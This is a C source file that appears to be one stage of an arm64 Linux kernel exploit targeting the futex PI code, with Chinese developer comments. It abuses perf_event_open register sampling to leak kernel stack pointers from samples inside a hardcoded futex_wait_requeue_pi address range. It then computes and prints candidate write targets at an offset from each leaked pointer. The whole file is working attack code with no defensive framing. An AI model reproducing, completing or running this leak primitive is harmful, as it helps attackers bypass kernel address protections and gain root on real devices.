/*
 * perf_sp_leak.c — Phase 1 v2: dump all sample IPs + SP to diagnose
 *
 * 问题：CPU clock sampling 命中 futex_wait_requeue_pi 的概率极低
 * 诊断：先看所有 sample 的 IP 分布，再决定下一步
 */
#include "common.h"
#include <linux/perf_event.h>

#define W_DELTA 0x90

/* futex_wait_requeue_pi range — 扩大范围以包含调用者 */
#define FWRP_START 0xffffffc008294000ULL  /* futex_lock_pi 起 */
#define FWRP_END   0xffffffc008297000ULL  /* 整个 futex PI 区域 */

void perf_sp_start(void) {
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.sample_period = 100;  /* 更高频率 */
    pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
    pe.sample_regs_intr = (1ULL << 32) - 1;
    pe.disabled = 1;
    pe.exclude_user = 1;
    pe.exclude_hv = 1;
    pe.exclude_idle = 1;

    int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) { pr_warning("perf_open failed %d\n", errno); return; }
    size_t msz = 4096 * (1 + 32);
    void *buf = mmap(NULL, msz, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return; }

    /* store fd/buf in file-static vars for stop function */
    extern int g_perf_fd;
    extern void *g_perf_buf;
    extern size_t g_perf_msz;
    g_perf_fd = fd;
    g_perf_buf = buf;
    g_perf_msz = msz;

    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
}

/* Use the same g_perf_fd/g_perf_buf globals */
int g_perf_fd = -1;
void *g_perf_buf = NULL;
size_t g_perf_msz = 0;

void perf_sp_stop_and_report(void) {
    if (g_perf_fd < 0) return;
    ioctl(g_perf_fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *hdr = g_perf_buf;
    uint64_t head = hdr->data_head;
    __sync_synchronize();
    char *base = (char *)g_perf_buf + 4096;
    size_t dsz = 4096 * 32;
    uint64_t pos = hdr->data_tail;

    int total = 0, in_range = 0;
    uint64_t sp_vals[512], ip_vals[512];
    int nsp = 0;

    /* IP histogram for diagnosis */
    uint64_t ip_hist[64];
    int ip_hist_cnt[64];
    int nhist = 0;

    while (pos < head && nsp < 512) {
        struct perf_event_header *ev = (void *)(base + (pos % dsz));
        if (ev->size == 0) break;
        if (ev->type == PERF_RECORD_SAMPLE) {
            total++;
            char *p = (char *)ev + sizeof(*ev);
            uint64_t ip = *(uint64_t *)p; p += 8;
            uint64_t abi = *(uint64_t *)p; p += 8;

            /* Record IP histogram */
            int found = 0;
            for (int j = 0; j < nhist; j++) {
                if (ip_hist[j] == ip) { ip_hist_cnt[j]++; found = 1; break; }
            }
            if (!found && nhist < 64) { ip_hist[nhist] = ip; ip_hist_cnt[nhist] = 1; nhist++; }

            if (ip >= FWRP_START && ip < FWRP_END) {
                in_range++;
                if (abi == 1 || abi == 2) {
                    uint64_t *regs = (uint64_t *)p;
                    uint64_t sp = regs[31];
                    if (sp > 0xffffff8000000000ULL && sp < 0xffffff8c00000000ULL) {
                        sp_vals[nsp] = sp;
                        ip_vals[nsp] = ip;
                        nsp++;
                    }
                }
            }
        }
        pos += ev->size;
    }

    hdr->data_tail = head;
    munmap(g_perf_buf, g_perf_msz);
    close(g_perf_fd);
    g_perf_fd = -1;

    pr_info("perf: total=%d in_range=%d kernel_sp=%d\n", total, in_range, nsp);

    /* Print top IPs */
    pr_info("=== top sample IPs ===\n");
    /* Sort by count */
    for (int i = 0; i < nhist; i++) {
        for (int j = i+1; j < nhist; j++) {
            if (ip_hist_cnt[j] > ip_hist_cnt[i]) {
                uint64_t t = ip_hist[i]; ip_hist[i] = ip_hist[j]; ip_hist[j] = t;
                int tc = ip_hist_cnt[i]; ip_hist_cnt[i] = ip_hist_cnt[j]; ip_hist_cnt[j] = tc;
            }
        }
    }
    for (int i = 0; i < nhist && i < 10; i++) {
        uint64_t ip = ip_hist[i];
        const char *label = "";
        if (ip >= 0xffffffc008294000ULL && ip < 0xffffffc008297000ULL)
            label = " <-- futex PI region";
        pr_info("  0x%016llx x%d%s\n", ip, ip_hist_cnt[i], label);
    }

    if (nsp > 0) {
        pr_info("=== W candidates ===\n");
        for (int i = 0; i < nsp; i++)
            pr_info("  IP=0x%016llx SP=0x%016llx W=0x%016llx\n",
                    ip_vals[i], sp_vals[i], sp_vals[i] + W_DELTA);
    }
}

int perf_sp_leak_experiment(void) { return 0; }
